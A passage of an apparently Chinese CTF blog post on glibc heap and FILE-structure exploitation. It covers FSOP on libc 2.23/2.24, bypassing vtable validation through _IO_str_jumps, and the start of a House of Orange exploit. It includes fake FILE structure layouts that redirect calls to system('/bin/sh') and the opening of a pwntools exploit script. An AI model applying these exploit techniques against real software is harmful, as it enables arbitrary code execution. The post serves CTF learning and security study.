href="https://xz.aliyun.com/t/5508">IOFILE利用</a></p><p><img src="/../images/1693383208549.png" alt="1693383208549"></p><p>(感慨</p><p>所以FSOP其实就是通过伪造 <em>_chain</em> 字段和劫持 <em>vtable</em> 去劫持 <em>_IO_OVERFLOW</em> ，其参数为flags，即 <em>IO_FILE_Struct</em> 首地址，从而完成劫持</p><h5 id="利用条件：-2"><a href="#利用条件：-2" class="headerlink" title="利用条件："></a>利用条件：</h5><p>伪造IO FILE结构体，并利用漏洞将<code>_IO_list_all</code>指向伪造的结构体，或是将该链表中的一个节点（<code>_chain</code>字段）指向伪造的数据，最终触发<code>_IO_flush_all_lockp</code>，绕过检查，调用<code>_IO_OVERFLOW</code>时实现执行流劫持。</p><p><strong>其中，绕过条件是检查缓冲区中是否有数据</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br></pre></td></tr></table></figure><p>于是，2.23下的FSOP可以构造如下的chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">._chain =&gt; chunk_addr</span><br><span class="line">chunk_addr</span><br><span class="line">&#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="comment">//对应此结构体首地址(fp)</span></span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x1</span>,</span><br><span class="line">      ...</span><br><span class="line">      _mode = <span class="number">0x0</span>, <span class="comment">//一般不用特意设置</span></span><br><span class="line">      _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = heap_addr</span><br><span class="line">&#125;</span><br><span class="line">heap_addr</span><br><span class="line">&#123;</span><br><span class="line">  __dummy = <span class="number">0x0</span>,</span><br><span class="line">  __dummy2 = <span class="number">0x0</span>,</span><br><span class="line">  __finish = <span class="number">0x0</span>,</span><br><span class="line">  __overflow = system_addr,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-24下的FSOP"><a href="#2-24下的FSOP" class="headerlink" title="2.24下的FSOP"></a>2.24下的FSOP</h4><p>在libc2.24之后，对虚表加入了检查，若是无法通过检查就会报错</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) \</span></span><br><span class="line"><span class="meta">  (IO_validate_vtable                                                   \</span></span><br><span class="line"><span class="meta">   (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS)   \</span></span><br><span class="line"><span class="meta">                 + (THIS)-&gt;_vtable_offset)))</span></span><br></pre></td></tr></table></figure><p>由此可以看出，在表用vtabel函数之前，内联进入了IO_validate_vtable函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t * <span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length)) <span class="comment">//检查vtable指针是否在glibc的vtable段中。</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们要知道的是，glibc中有一个段存放的是各个vtable指针，如果不在glbc段内，就继续调用 _<em>IO_vtable_check</em> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> attribute_hidden _IO_vtable_check (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="type">void</span> (*flag) (<span class="type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check) <span class="comment">//检查是否是外部重构的vtable</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"> </span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (_dl_open_hook != <span class="literal">NULL</span></span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE)) <span class="comment">//检查是否是动态链接库中的vtable</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">...</span><br><span class="line"> </span><br><span class="line">  __libc_fatal (<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以，最好的办法就是，我们伪造的vtable应该在glibc的vtable段中，这样子就可以很自然的绕过这个检查，目前来说有以下几种比较好用的方法</p><ol><li><p>利用 <em>_IO_str_jumps</em> 中的 <em>_IO_str_finish()</em> 函数</p><p>该结构体的源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以发现，这里有一句 <code>JUMP_INIT(finish, _IO_str_finish)</code> </p><p>继续对源码分析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base); <span class="comment">//执行函数</span></span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer;</span><br><span class="line">  _IO_free_type _free_buffer;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br></pre></td></tr></table></figure><p>可以看到，这里直接把 <code>fp-&gt;_s._free_buffer</code> 的内容当做函数地址来直接调用</p><p>当然，我们仍然需要绕过2.23中的 对于mode等的检查，之后把vtable劫持为 <code>_IO_str_jumps-0x8</code> ，这里相当劫持了 <code>_IO_OVERFLOW</code> 成为 <code>_IO_str_finish</code> 这个vtable可以绕过检查，因为他在vtable的地址段之中</p><p>由于libc中不存在该函数，可以利用如下的函数进行定位：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># libc.address = libc_base</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_IO_str_jumps</span>():</span><br><span class="line">    IO_file_jumps_addr = libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">    IO_str_underflow_addr = libc.sym[<span class="string">&#x27;_IO_str_underflow&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> ref <span class="keyword">in</span> libc.search(p64(IO_str_underflow_addr-libc.address)):</span><br><span class="line">        possible_IO_str_jumps_addr = ref - <span class="number">0x20</span></span><br><span class="line">        <span class="keyword">if</span> possible_IO_str_jumps_addr &gt; IO_file_jumps_addr:</span><br><span class="line">            <span class="keyword">return</span> possible_IO_str_jumps_addr</span><br></pre></td></tr></table></figure><p>于是可以构造如下的chunk，来进行getshell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">._chain =&gt; chunk_addr</span><br><span class="line">chunk_addr</span><br><span class="line">&#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x1</span>,</span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_base = bin_sh_addr,</span><br><span class="line">      ...</span><br><span class="line">      _mode = <span class="number">0x0</span>, <span class="comment">//一般不用特意设置</span></span><br><span class="line">      _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = _IO_str_jumps<span class="number">-8</span> <span class="comment">//chunk_addr + 0xd8 ~ +0xe0</span></span><br><span class="line">&#125;</span><br><span class="line">+<span class="number">0xe0</span> ~ +<span class="number">0xe8</span> : <span class="number">0x0</span></span><br><span class="line">+<span class="number">0xe8</span> ~ +<span class="number">0xf0</span> : system_addr / one_gadget <span class="comment">//fp-&gt;_s._free_buffer</span></span><br></pre></td></tr></table></figure></li><li><p>利用 _<em>IO_str_overflow()</em> 的手段：</p><p>源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *new_buf;</span><br><span class="line">  <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">  <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">  <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  new_buf = (<span class="type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br><span class="line">  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/*  __ferror(fp) = 1; */</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (old_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">      <span class="built_in">free</span> (old_buf);</span><br><span class="line">      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">  _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure><p>类似与第一种方法，我们看到源码中使用了 <code>new_buf = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</code> 那我们就劫持他为sysytem的地址，把newsize改为&#x2F;bin&#x2F;sh\x00即可</p><p>又有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br><span class="line"><span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line"><span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line"><span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br></pre></td></tr></table></figure><p>可以得到，我们只需要进行如下设置即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_IO_buf_base = <span class="number">0</span></span><br><span class="line">_IO_buf_end = (bin_sh_addr - <span class="number">100</span>) <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><p>可以进行如下布局：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">._chain =&gt; chunk_addr</span><br><span class="line">chunk_addr</span><br><span class="line">&#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x1</span>,</span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_end = (bin_sh_addr - <span class="number">100</span>) <span class="comment">// 2,</span></span><br><span class="line">      ...</span><br><span class="line">      _mode = <span class="number">0x0</span>, <span class="comment">//一般不用特意设置</span></span><br><span class="line">      _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = _IO_str_jumps <span class="comment">//chunk_addr + 0xd8 ~ +0xe0</span></span><br><span class="line">&#125;</span><br><span class="line">+<span class="number">0xe0</span> ~ +<span class="number">0xe8</span> : system_addr / one_gadget <span class="comment">//fp-&gt;_s._allocate_buffer</span></span><br></pre></td></tr></table></figure><p>在libc2.28之后，使用了malloc和free替代，FSOP也就从此失效了</p></li></ol><h4 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h4><h5 id="pre：get-a-freed-chunk"><a href="#pre：get-a-freed-chunk" class="headerlink" title="pre：get a freed chunk"></a>pre：get a freed chunk</h5><p>house of orange主要在没有free的情况下通过 <em>uaf</em> 修改topchunk的的size，这样子分配chunk的时候，分配一个大于topchunk的chunk，就会把topchunk放到unsortedbin中，然后我们就获得了一个可以利用的chunk</p><h5 id="FSOP部分"><a href="#FSOP部分" class="headerlink" title="FSOP部分"></a>FSOP部分</h5><p>利用 <em>unsortedbinattack</em> 修改<em>IO_list_all</em> 为 <em>main_arena+88</em> ，然后很巧的是，此时 <code>_chain</code> 字段正好为 <em>smallbin</em> 的开头</p><h5 id="WP-amp-amp-exp"><a href="#WP-amp-amp-exp" class="headerlink" title="WP&amp;&amp;exp"></a>WP&amp;&amp;exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">r=process(<span class="string">&quot;./orange&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content, price, color</span>):</span><br><span class="line">r.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">r.recvuntil(<span class="string">&quot;Name :&quot;</span>)</span><br><span class="line">r.send(content)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(price))</span><br><span class="line">r.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>)<span class="comment">#1-7</span></span><br><span class="line">r.sendline(<span class="built_in">str</span>(color))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">r.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size, content, price, color</span>):</span><br><span class="line">r.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">r.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">r.send(content)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(price))</span><br><span class="line">r.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(color))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>,<span 